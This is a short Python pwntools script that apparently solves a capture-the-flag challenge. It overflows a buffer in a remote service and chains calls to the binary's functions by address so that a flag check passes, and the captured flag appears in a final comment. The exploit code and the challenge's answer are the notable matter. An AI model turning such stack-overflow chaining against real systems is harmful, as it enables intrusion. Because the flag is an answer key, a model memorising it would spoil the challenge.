from pwn import *

"""
0x080491f6  add_500
0x0804923e  add_20
0x08049283  add_2
0x080492c8  sub_100
0x0804930d  sub_10
0x08049352  sub_5
0x08049397  sub_1
"""

# p = process('./fake_chal')
p = remote('pwn.ctf.ae', 9814)

check_flag = 0x080493dc
add_500 = 0x080491f6
add_20 = 0x0804923e
sub_100 = 0x080492c8
sub_1 = 0x08049397

# pl = cyclic(500)
pl = b'A'*cyclic_find(0x616c6161)
pl += 3 * p32(add_500)
pl += 2 * p32(sub_100)
pl += 2 * p32(add_20)
pl += 3 * p32(sub_1)
pl += p32(check_flag)

# pause()
p.sendline(pl)
p.interactive()

# CTFAE{HopLikeABunnyTillYouMakeIt}
